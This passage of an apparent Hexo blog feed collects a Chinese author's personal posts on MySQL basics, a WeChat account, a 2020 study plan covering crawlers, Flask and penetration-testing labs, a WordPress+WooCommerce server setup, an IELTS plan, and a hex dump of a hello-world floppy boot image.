<li><p>使用一个数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use my_data;</span><br></pre></td></tr></table></figure></li>
<li><p>显示当前数据库是哪一个</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> database();</span><br></pre></td></tr></table></figure>
</li>
<li><p>显示当前表的创建语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> my_data;</span><br></pre></td></tr></table></figure></li>
<li><p>通过as给表起别名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> s.name, s.age <span class="keyword">from</span> students <span class="keyword">as</span> s;</span><br></pre></td></tr></table></figure></li>
<li><p>通过distinct消除重复行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> s.name, s.age <span class="keyword">from</span> students <span class="keyword">as</span> s;</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>where条件查询</li>
</ol>
<ul>
<li>比较运算符<ul>
<li><code>&gt;</code>,<code>&lt;</code>,<code>=</code>,<code>!=</code>,<code>&lt;&gt;</code>,<code>&gt;=</code>,<code>&lt;=</code></li>
</ul>
</li>
<li>逻辑运算符<ul>
<li>and</li>
<li>or</li>
<li>not</li>
</ul>
</li>
<li>模糊查询<ul>
<li>like<ul>
<li><code>%</code>替换1个或多个字符</li>
<li><code>_</code>替换1个字符</li>
</ul>
</li>
<li>rlike<ul>
<li>正则匹配</li>
</ul>
</li>
</ul>
</li>
<li>范围查询<ul>
<li>in</li>
<li>not in</li>
<li>between and</li>
<li>not between and</li>
</ul>
</li>
<li>空判断<ul>
<li>is null</li>
<li>is not null</li>
</ul>
</li>
</ul>
<ol start="3">
<li>排序</li>
</ol>
<ul>
<li>升序，asc（默认）</li>
<li>降序，desc</li>
</ul>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>我的微信公众号马上两岁啦</title>
    <url>//posts/ZH-CN/welcome-to-my-wechat-public-account.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转眼我的微信公众号也快满两岁了，专注于互联网、英语、创业等领域，欢迎关注~~</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="开门见山"><a href="#开门见山" class="headerlink" title="开门见山"></a>开门见山</h2><p>我的微信公众号：“肖坤稼”，以自己名字命名没有其他意思，就是想打造个人IP，毕竟从小都想成名^.^<br>二维码在此，请扫描吧，关注之后可以在本文留下一个愿望，博主保证善良的你一定会愿望成真的！！<br><img src="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg" alt="qrcode_for_gh_9b7280eb1edc_258.jpg"></p>
<h2 id="初衷"><a href="#初衷" class="headerlink" title="初衷"></a>初衷</h2><p>刚开始申请公众号纯属猎奇，因为刚关掉QQ空间，总想再找个没人能看到的角落发发牢骚，伤春悲秋。最初写的文章也确实都是些矫情文字。</p>
<h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><p>目前公众号定位：互联网+英语。定期推送经济学人Espresso最新原版新闻以拓展国际视野，并和大家一起积累好词佳句。由于博主同时是个互联网爱好者，对IT、建站、网络安全都有所涉猎，不定期也会分享相关教程（教程一定是自己亲自实践过的）以及学习资料，希望可以和大家一起共同进步，成为更好的自己。<br>当然个人也有私心，希望能够通过这种方式监督自己定期更文。</p>
<h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><p>感谢你看到这里，如果你也对IT、英语感兴趣，关注我，一定能给你不一样的体验。<br>再次亮出二维码，点关注的都是活菩萨。<br><img src="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg" alt="qrcode_for_gh_9b7280eb1edc_258.jpg"></p>
]]></content>
      <categories>
        <category>运营</category>
      </categories>
      <tags>
        <tag>微信公众号</tag>
        <tag>庆祝</tag>
      </tags>
  </entry>
  <entry>
    <title>2020学习计划</title>
    <url>//posts/ZH-CN/2020_Study_Plan.html</url>
    <content><![CDATA[<h2 id="学习什么"><a href="#学习什么" class="headerlink" title="学习什么"></a>学习什么</h2><ul>
<li>渗透学习<ul>
<li>基础知识：<ul>
<li>python脚本</li>
<li>shell脚本</li>
<li>还有很多，但是今年主要把python和shell学到熟练应用的程度。</li>
</ul>
</li>
<li>漏洞原理学习：<ul>
<li>vulhub靶场</li>
<li>DVWA靶场</li>
<li>testfire靶站</li>
<li>还有很多可练习的地方，今年重点掌握sql语言和sql注入的原理、攻击手法、攻击工具。</li>
</ul>
</li>
<li>渗透测试实战：<ul>
<li>流程怎样</li>
<li>工具哪些</li>
<li>虽然脚本小子是个偏贬义的词，但是先成为一个会使用工具的人吧。但是还是有一颗造轮子的心哈。</li>
</ul>
</li>
<li>现在想到的就这些，也是基于个人情况做的计划。网上有很多学习规划及建议，现阶段我就这么定吧，以后慢慢调整。先做局部了解，再尝试宏观串接。</li>
</ul>
</li>
</ul>
<p><escape> <span id="more"></span></escape></p>
<h2 id="具体计划"><a href="#具体计划" class="headerlink" title="具体计划"></a>具体计划</h2><p>缺的不是学习资源，需要的是一个坚定的目标。网盘堆了一堆学习资料，是时候把他们请出来了。</p>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h5 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h5><ul>
<li><p>通用爬虫模块：</p>
<ul>
<li>爬虫基本概念：8 videos <code>通识</code><ol>
<li>字符串知识</li>
<li>http概念</li>
<li>markdown介绍</li>
<li>url格式和http请求</li>
<li>爬虫的流程</li>
<li>爬虫介绍及概念</li>
<li>搜索引擎的工作原理</li>
<li>浏览器发送请求的流程</li>
</ol>
</li>
<li>爬虫requests库：7 videos <code>通识</code><ol>
<li>requests发送带header和参数的请求</li>
<li>贴吧爬虫</li>
<li>requests发送post请求</li>
<li>requests使用代理</li>
<li>requests模拟登录的三种方式</li>
<li>requests获取网页字符串</li>
<li>requests保存图片</li>
</ol>
</li>
<li>chrome分析post和json：3 videos <code>通识</code><ol>
<li>寻找post地址</li>
<li>寻找并分析js</li>
<li>requests小技巧</li>
</ol>
</li>
<li>爬虫数据-json数据处理：5 videos <code>通识</code><ol>
<li>数据分类</li>
<li>json模块学习（一）</li>
<li>json模块学习（二）</li>
<li>kr练习</li>
<li>豆瓣爬虫练习</li>
</ol>
</li>
<li>爬虫数据-正则处理数据：2 videos <code>通识</code><ol>
<li>正则和原始字符串</li>
<li>内涵段子爬虫</li>
</ol>
</li>
<li>爬虫数据-xpath处理数据：4 videos <code>通识</code><ol>
<li>xml的了解</li>
<li>xpath的学习（一）</li>
<li>xpath的学习（二）</li>
<li>xml模块学习</li>
</ol>
</li>
<li>通用爬虫案例：7 videos <code>实例</code><ol>
<li>贴吧爬虫（一）</li>
<li>贴吧爬虫（二）</li>
<li>糗百爬虫（一）</li>
<li>糗百爬虫（二）</li>
<li>爬虫思路总结</li>
<li>csv</li>
<li>多线程爬虫</li>
</ol>
</li>
<li>爬取动态html数据：3 videos <code>实例</code><ol>
<li>分析</li>
<li>hemlt介绍</li>
<li>selenium入门使用</li>
</ol>
</li>
<li>豆瓣登录案例：4 videos <code>实例</code><ol>
<li>豆瓣登录</li>
<li>打码平台的使用</li>
<li>验证码识别总结</li>
<li>元素定位的方法、iframe切换、selenium使用</li>
</ol>
</li>
<li>斗鱼爬虫：3 videos <code>实例</code><ol>
<li>tesseract使用</li>
<li>driver安装</li>
<li>斗鱼爬虫</li>
</ol>
</li>
</ul>
<ul>
<li>待续：看学习情况怎样，学完这部分，再做进一步计划</li>
</ul>
</li>
</ul>
<p>一个video差不多在20min以内。前面的29个video，应该是通识类的知识。后面的17个video涉及实例较多。<br>15小时应该可以把通识类知识了解一遍。之后集中用一个周时间练习实例。总结输出，形成自己的知识。</p>
<hr>
<p>2020-2-15-接续</p>
<ul>
<li>scrapy框架爬虫：<ul>
<li>scrapy框架介绍：3 videos <code>通识</code><ol>
<li>scrapy的介绍</li>
<li>scrapy的流程</li>
<li>scrapy的入门使用 </li>
</ol>
</li>
<li>scrapy-pipline、item、shell：8 videos <code>通识</code><ol>
<li>pipline的介绍</li>
<li>logging模块的使用</li>
<li>构造请求和腾讯爬虫</li>
<li>item的介绍和使用</li>
<li>阳光政务平台爬虫</li>
<li>debug信息的认识</li>
<li>scrapy shell的使用</li>
<li>scrapy ettings和管道的深入</li>
</ol>
</li>
<li>苏宁图书案例：2 videos <code>实例</code><ol>
<li>苏宁图书爬虫01</li>
<li>苏宁图书爬虫02</li>
</ol>
</li>
<li>scrapy-crawlspider：2 videos <code>实例</code><ol>
<li>crawlspider爬虫案例</li>
<li>crawlspider爬虫介绍</li>
</ol>
</li>
<li>scrapy-downloadmiddleware：4 videos <code>通识</code><ol>
<li>携带cookie登录</li>
<li>下载中间件的学习</li>
<li>发送post请求登录</li>
<li>介绍和总结</li>
</ol>
</li>
<li>百度贴吧crawlspider版本：1 video <code>案例</code><ol>
<li>贴吧爬虫和crawlspider爬虫</li>
</ol>
</li>
<li>scrapy-分布式：5 videos <code>通识</code><ol>
<li>scrapyredis的介绍</li>
<li>redis复习</li>
<li>domz程序介绍</li>
<li>scrapy_redis的源码</li>
<li>jd爬虫</li>
</ol>
</li>
<li>分布式爬虫案例：8 videos <code>实例</code><ol>
<li>当当爬虫01</li>
<li>当当爬虫02</li>
<li>当当爬虫运行演示</li>
<li>亚马逊爬虫</li>
<li>亚马逊爬虫02</li>
<li>亚马逊爬虫03</li>
<li>pycharm发布代码</li>
<li>crontab的使用</li>
</ol>
</li>
</ul>
</li>
</ul>
<p>20个通识类video，13个实例类video。通识类差不多要10个小时学完，一天时间通看一遍，第二天做练习并记录。实例类花一个周时间练习并总结。</p>
<hr>
<p>2020-2-24-接续</p>
<ul>
<li>flask框架爬虫：<ul>
<li>flask安装配置：4 videos <code>通识</code><ol>
<li>回顾http通讯</li>
<li>认识flask</li>
<li>虚拟环境工具说明</li>
<li>第一个flask程序</li>
</ol>
</li>
<li>app对象的初始化和配置：5 videos <code>通识</code><ol>
<li>flask应用对象初始化参数说明</li>
<li>静态文件目录与路由说明</li>
<li>flask的配置参数设置</li>
<li>读取配置参数的方式</li>
<li>app的run使用说明</li>
</ol>
</li>
<li>视图函数的路由：3 videos <code>通识</code><ol>
<li>视图函数的路由规则设置说明</li>
<li>路由提取参数与自定义路由转换器</li>
<li>路由转换器的进阶使用</li>
</ol>
</li>
<li>request对象： 3 videos <code>通识</code><ol>
<li>request的form_data_args用法</li>
<li>上传文件</li>
<li>with使用</li>
</ol>
</li>
<li>abort函数、自定义错误、视图函数的返回值：4 videos <code>通识</code><ol>
<li>abort函数的使用</li>
<li>自定义错误处理方法</li>
<li>设置响应信息的方法</li>
<li>返回json数据的方法</li>
</ol>
</li>
<li>cookie和session：3 videos <code>通识</code><ol>
<li>cookie的使用</li>
<li>postman安装</li>
<li>session机制说明</li>
</ol>
</li>
<li>flask上下文和请求钩子：4 videos <code>通识</code><ol>
<li>请求钩子的补充说明</li>
<li>flask的上下文对象</li>
<li>请求钩子</li>
<li>flask_script脚本扩展的使用</li>
</ol>
</li>
<li>模板：8 videos <code>通识</code><ol>
<li>模板与自定义过滤器</li>
<li>引入表单扩展</li>
<li>创建表单模型类与模板使用</li>
<li>使用表单接受并检验参数</li>
<li>关于表单的补充说明</li>
<li>模板宏的使用</li>
<li>宏定义在外部的使用</li>
<li>模板的闪现使用</li>
</ol>
</li>
<li>数据库扩展包flask-sqlalchemy：7 videos <code>实例</code><ol>
<li>使用sqlalchemy的配置</li>
<li>创建模型类</li>
<li>创建数据库表</li>
<li>保存数据</li>
<li>sqlalchemy数据库查询</li>
<li>关联查询与自定义显示信息</li>
<li>数据的修改与删除</li>
</ol>
</li>
<li>图书案例：2 videos <code>实例</code><ol>
<li>图书作者小案例</li>
<li>图书作者小案例2</li>
</ol>
</li>
<li>数据库迁移扩展包Flask-Migrate、邮件扩展包Flask-Mail：3 videos <code>通识</code><ol>
<li>数据库migrate扩展的使用简介</li>
<li>migrate扩展的使用</li>
<li>使用flask发送邮件</li>
</ol>
</li>
<li>不使用蓝图解决模块划分问题：2 videos <code>实例</code><ol>
<li>循环引用</li>
<li>使用装饰器解决模块分割问题</li>
</ol>
</li>
<li>使用蓝图划分模块：3 videos <code>通识</code><ol>
<li>蓝图的基本定义与使用</li>
<li>以目录形式定义蓝图</li>
<li>蓝图里模板目录的处理</li>
</ol>
</li>
<li>单元测试：5 videos <code>实例</code><ol>
<li>单元测试引入</li>
<li>assert断言的使用</li>
<li>实现简单的单元测试</li>
<li>单元测试的setUp与flask的测试模式</li>
<li>数据库测试</li>
</ol>
</li>
<li>flask部署：2 videos <code>实例</code><ol>
<li>flask部署</li>
<li>sqlalchemy操作mysql提示警告的问题</li>
</ol>
</li>
</ul>
</li>
</ul>
<p>一共43个通识类视频，18个实例类视频。通识类大概需要22个小时看完，花两天时间通看一遍。总结并练习，预计一共花两个周时间。</p>
<h5 id="shell脚本"><a href="#shell脚本" class="headerlink" title="shell脚本"></a>shell脚本</h5><p>13 videos，每个video将近3小时。说明讲解很细致，也有可能废话有点多。<br>一周花三天时间学习这部分，一个月看完。总结输出，形成自己的知识。</p>
<h3 id="漏洞原理学习"><a href="#漏洞原理学习" class="headerlink" title="漏洞原理学习"></a>漏洞原理学习</h3><p>这部分先从sql注入开始练习，在靶场练习，记录练习过程，要让自己以后能看懂。一周花一天时间专门学习sql注入。modsecurity+nginx这种架构必须自己部署一盘，学习攻防是怎么对抗的。<br>每天了解一个漏洞，可以先当搬运工。多搬运，先把各种漏洞认个眼熟。</p>
<h3 id="渗透测试实战"><a href="#渗透测试实战" class="headerlink" title="渗透测试实战"></a>渗透测试实战</h3><p>把基础知识学扎实，多观摩whale的博客，看看别人是怎么学习的。</p>
<hr>
<p>写到这儿，就开始头痛了。。我清楚地知道，现在正处于血槽过满的状态。但是必须记下这种状态，在低迷的时候，看看这些，就提醒自己还有很多很多事需要做，还有很多很多愿望需要完成。</p>
]]></content>
      <categories>
        <category>学习计划</category>
        <category>丧必读</category>
      </categories>
      <tags>
        <tag>2020学习计划</tag>
      </tags>
  </entry>
  <entry>
    <title>如何搭建Wordpress+Woocommerce电商网站</title>
    <url>//posts/ZH-CN/how-to-build-an-eShop.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上个月就想用wordpress建一个电商网站，初衷很简单，就是发现这是个能赚钱的活。接下来就开始尝试用Wordpress+Woocommerce搭建一个电商网站。<br><escape> <span id="more"></span></escape></p>
<p>（截图取自一家专做跨境电商的建站平台）</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image.md.png" alt="Function list.png"></p>
<h2 id="项目计划"><a href="#项目计划" class="headerlink" title="项目计划"></a>项目计划</h2><pre class="mermaid">gantt
dateFormat MM-DD
axisFormat %m-%d
todayMarker on
section 1. 环境准备
1.1 安装VPS服务器: done,des1-1,08-15,1d
1.2 设置域名DNS: done,des1-2,after des1-1,1d
1.3 搭建LNMP环境: done,crit,des1-3,after des1-2,1d

section 2. 配置Wordpress
2.1 安装Wordpress: done,des2-1,after des1-3,1d
2.2 设置Wordpress主题: done,des2-2,after des2-1,1d
2.3 安装Woocommerce插件: done,after des2-2,1d

section 3. 配置Woocommerce
3.1 调整Wocommerce配置: des3-1,after des2-3,1d
3.2 网站SEO优化设置: des3-2,after des3-1,3d</pre>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="安装VPS服务器"><a href="#安装VPS服务器" class="headerlink" title="安装VPS服务器"></a>安装VPS服务器</h3><p>首先到<a href="vultr.com">vultr官网</a>添加一台VPS服务器（操作系统：CentOS8），我选择的配置信息如图：<br><a href="https://v2ray.dana5haw.com:8008/image/38py"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image9bd2abf153c8950b.md.png" alt="My VPS configuration.png"></a></p>
<p>使用平台设置的root密码登录到VPS，发现这台机器被尝试过爆破SSH密码。为了服务器的安全，我需要把SSH服务的端口改了，并且修改root密码。<br><a href="https://v2ray.dana5haw.com:8008/image/3XEA"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image3f5915c4d95d6140.md.png" alt="The SSH password has almost been blasted.png"></a></p>
<ol>
<li>修改root密码</li>
</ol>
<p>使用远程SSH工具（我一般用MobaXterm免费版作为远程工具），以root账号登录服务器，修改root密码。依次输入以下两条命令。</p>
<ul>
<li>passwd root</li>
<li>reboot</li>
</ul>
<p>现在可以用最新设置的root密码登录服务器了。</p>
<ol start="2">
<li>修改SSH服务端口</li>
</ol>
<p>接下来修改SSH端口为5位数。<br><a href="https://v2ray.dana5haw.com:8008/image/3419"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image0a867116b267cdf4.md.png" alt="Modify the SSH port.png"></a></p>
<ul>
<li>修改ssh服务的配置文件<code>/etc/ssh/sshd_config</code>，修改<code>Port 22</code>这行代码，取消注释，并将端口号改为5位数</li>
<li>防火墙开放相应端口号(比如的SSH端口改为了11111)：<code>firewall-cmd --add-port=11111/tcp --permanent</code></li>
<li>防火墙配置改了之后记得reload：<code>firewall-cmd --reload</code></li>
<li>重启ssh服务：<code>systemctl restart sshd</code></li>
</ul>
<p>备注：如果按照以上操作无法重启ssh服务，请将selinux永久关闭。具体操作方法如下：</p>
<ul>
<li>编辑SELinux配置文件<code>/etc/selinux/config</code>，修改<code>SELINUX=enforcing</code>这行代码，改为<code>SELINUX=disabled</code></li>
<li>重启服务器：<code>reboot</code></li>
</ul>
<p>现在可以用新的ssh端口和新的root密码远程登录服务器了。</p>
<h3 id="设置域名DNS"><a href="#设置域名DNS" class="headerlink" title="设置域名DNS"></a>设置域名DNS</h3><p>因为我已经注册过域名，登录到域名提供商网站（我用的是Dynadot），新增一个二级域名(eShop.dana5haw.com)，添加DNS的A 记录，IP填写这台新的服务器就可以了。<br><a href="https://v2ray.dana5haw.com:8008/image/3TnO"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image4d777a3c092a1a71.md.png" alt="Set DNS.png"></a></p>
<h3 id="搭建LNMP环境"><a href="#搭建LNMP环境" class="headerlink" title="搭建LNMP环境"></a>搭建LNMP环境</h3><p>LNMP是什么？Linux+Nginx+Mysql+PHP=LNMP，是一种网站架构，Wordpress建站一般使用LNMP架构。</p>
<p>（截图取自百度百科）</p>
<p><a href="https://v2ray.dana5haw.com:8008/image/3KF6"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/imageea7b4b82259ef599.md.png" alt="What is LNMP.png"></a></p>
<p>我完全按照腾讯的一篇<a href="https://cloud.tencent.com/document/product/213/49304">官方操作文档</a>进行安装的，过程很顺利。<br>这篇文章的排版和思路都很好，值得学习。</p>
<h2 id="配置Wordpress"><a href="#配置Wordpress" class="headerlink" title="配置Wordpress"></a>配置Wordpress</h2><h3 id="安装Wordpress"><a href="#安装Wordpress" class="headerlink" title="安装Wordpress"></a>安装Wordpress</h3><p>以下操作步骤参考了阿里云这篇<a href="https://help.aliyun.com/document_detail/184111.html">官方操作文档</a>，过程还算顺利。请安装最新版本<a href="https://wordpress.org/download/#download-install">Wordpress</a>，否则无法安装最新的WooCommerce插件。就是注意Mysql的登录密码不要设置得太复杂。我最初的密码包含了很多特殊字符，导致无法正常登录Mysql，也许是密码的某些特殊字符需要做转义。</p>
<ul>
<li>设置Wordpress的Mysql数据库</li>
</ul>
<p>数据库名称：wordpress<br>用户名：user</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create database wordpress;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line">mysql&gt; create user &#x27;user&#x27;@&#x27;localhost&#x27; identified by &#x27;填写密码&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; grant all privileges on wordpress.* to &#x27;user&#x27;@&#x27;localhost&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>PHP连接数据库</li>
</ul>
<p>修改PHP配置文件，填写数据库信息，使得PHP能登录到Mysql。<br>配置文件：<code>/usr/share/nginx/html/wordpress/wp-config.php</code><br>修改之后的配置文件如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line">define( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line">define( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;user&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line">define( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;填写密码&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line">define( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br></pre></td></tr></table></figure>

<ul>
<li>登录Wordpress安装后台</li>
</ul>
<p>输入服务器IP地址或者域名即可访问Wordpress安装后台。</p>
<p><a href="https://v2ray.dana5haw.com:8008/image/3eDL"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image0f064389d4bd519e.md.png" alt="Install wordpress(1).png"></a></p>
<p><a href="https://v2ray.dana5haw.com:8008/image/3uje"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image9fa4dc5d6fbc4d5b.md.png" alt="Install success.png"></a></p>
<ul>
<li>默认网站</li>
</ul>
<p>Wordpress安装完成之后，输入域名即可访问默认的网站。</p>
<p><a href="https://v2ray.dana5haw.com:8008/image/3223"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image24f4502383b50628.md.png" alt="Default web.png"></a></p>
<h3 id="安装Wordpress主题"><a href="#安装Wordpress主题" class="headerlink" title="安装Wordpress主题"></a>安装Wordpress主题</h3><p>在网上大概找了一下，选择了<a href="https://pressmaximum.com/">Customify</a>这款免费主题。</p>
<ul>
<li>下载主题压缩包</li>
<li>将压缩包上传到网站主题文件夹<code>/usr/share/nginx/html/wordpress/wp-content/themes</code></li>
<li>解压压缩包<code>unzip customify.0.3.6.zip</code></li>
</ul>
<p><a href="https://v2ray.dana5haw.com:8008/image/3O5B"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image7d972944a0719dd7.md.png" alt="Upload theme.png"></a></p>
<ul>
<li>进入Wordpress网站后台，Customize→Change→Live Preview→Active&amp;Publish</li>
</ul>
<p><a href="https://v2ray.dana5haw.com:8008/image/3f3p"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/imageaea7d0a23253ff0d.md.png" alt="Customize.png"></a></p>
<p><a href="https://v2ray.dana5haw.com:8008/image/3q4h"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/imagea634a95b584a658f.md.png" alt="Change.png"></a></p>
<p><a href="https://v2ray.dana5haw.com:8008/image/3yE7"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image92cffba9eb1e5ff5.md.png" alt="Customify.png"></a></p>
<p><a href="https://v2ray.dana5haw.com:8008/image/3SZY"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image5032cb3af73ee031.md.png" alt="Active.png"></a></p>
<h3 id="安装Woocommerce插件"><a href="#安装Woocommerce插件" class="headerlink" title="安装Woocommerce插件"></a>安装Woocommerce插件</h3><ul>
<li>从Wordpress官网下载<a href="https://wordpress.org/plugins/woocommerce/#installation">Woocommerce</a>插件。</li>
<li>将压缩包上传到网站插件文件夹<code>/usr/share/nginx/html/wordpress/wp-content/plugins</code></li>
<li>解压压缩包<code>unzip woocommerce.5.5.2.zip</code></li>
</ul>
<p><a href="https://v2ray.dana5haw.com:8008/image/3Wvx"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image32db91224cd710e8.md.png" alt="Install Woocommerce.png"></a></p>
<ul>
<li>进入Wordpress网站Dashboard后台，Plugins→Woocommerce→Active</li>
</ul>
<p><a href="https://v2ray.dana5haw.com:8008/image/3iFS"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image86e7663de41f54ca.md.png" alt="Active.png"></a></p>
<p>遇到一个报错，说明需要升级Wordpress版本。（如果看了最开始的提示，就避过了这个坑）<br><a href="https://v2ray.dana5haw.com:8008/image/3rHG"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image145b16bf0814f3f5.md.png" alt="Error.png"></a></p>
<p>于是手动升级Wordpress到<a href="https://wordpress.org/download/#download-install">最新版本</a>。具体操作不再赘述，我是完全删掉旧版Wordpress之后重新安装了。</p>
<p>最终激活成功，继续配置Woocommerce。</p>
<p><a href="https://v2ray.dana5haw.com:8008/image/3M3Q"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image8a8628e69b648dc8.md.png" alt="Configure Woocommerce.png"></a></p>
<p><a href="https://v2ray.dana5haw.com:8008/image/3d4u"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/imagec825cd07baffa010.md.png" alt="Woocommerce.png"></a></p>
<p>网站的雏形搭好了，但是内存告急哦。<br><a href="https://v2ray.dana5haw.com:8008/image/35Uc"><img src="https://v2ray.dana5haw.com:8008/images/2021/08/15/image7aead796b03a81e7.md.png" alt="Memory.png"></a></p>
]]></content>
      <categories>
        <category>eShop</category>
        <category>电商网站</category>
      </categories>
      <tags>
        <tag>Wordpress</tag>
        <tag>VPS</tag>
        <tag>Woocommerce</tag>
        <tag>eShop</tag>
        <tag>电商网站</tag>
        <tag>独立站</tag>
      </tags>
  </entry>
  <entry>
    <title>2021雅思计划</title>
    <url>//posts/ZH-CN/ielts-plan.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2021年12月考雅思，目标分数7。<br><escape> <span id="more"></span></escape></p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/11/29/image.png" alt="image.png"></p>
<h2 id="口语"><a href="#口语" class="headerlink" title="口语"></a>口语</h2><ul>
<li>争取在工作中接触欧美客户，在会议中锻炼口语</li>
<li>每周练习一个话题</li>
</ul>
<h2 id="听力"><a href="#听力" class="headerlink" title="听力"></a>听力</h2><ul>
<li>一周一篇雅思真题</li>
</ul>
<h2 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h2><ul>
<li>一周两篇雅思真题<ul>
<li>50*2=100</li>
<li>坚持做满100篇</li>
</ul>
</li>
<li>参加或组建经济学人阅读计划<ul>
<li>每周至少一篇精读</li>
</ul>
</li>
</ul>
<h2 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h2><ul>
<li>一周背诵一篇范文，并脱稿录制youtube</li>
</ul>
]]></content>
      <categories>
        <category>plan</category>
      </categories>
      <tags>
        <tag>plan</tag>
      </tags>
  </entry>
  <entry>
    <title>30天自制操作系统-vmware添加二进制img镜像跑起来</title>
    <url>//posts/ZH-CN/Os_Vmware_Img.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>玩一把，用二进制文件制作软盘驱动镜像，放到vmware里面跑起来。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="制作软盘驱动镜像"><a href="#制作软盘驱动镜像" class="headerlink" title="制作软盘驱动镜像"></a>制作软盘驱动镜像</h2><p>软盘驱动镜像img文件，其实就是用二进制编辑器BZ编辑二进制之后，另存为后缀为img的文件。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gctddf1h3qj31f60u0dof.jpg" alt="image.png"></p>
<details><summary>二进制文件的内容：（注：其余部分都是`00`，总共001400行）</summary>
<p>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000000-&gt;000080：</span><br><span class="line">EB4E9048 454C4C4F 49504C00 02010100 02E00040 0BF00900 12000200 00000000 400B0000 000029FF FFFFFF48 454C4C4F 2D4F5320 20204641 54313220 20200000 00000000 00000000 00000000 00000000 B800008E D0BC007C 8ED88EC0 BE747C8A 0483C601 3C007409 B40EBB0F 00CD10EB EEF4EBFD 0A0A6865 6C6C6F2C 20776F72 6C640A00</span><br><span class="line">0001F0：</span><br><span class="line">00000000 00000000 00000000 000055AA F0FFFF00 00000000 </span><br><span class="line">001400：F0FFFF</span><br></pre></td></tr></table></figure>

</p>
</details>

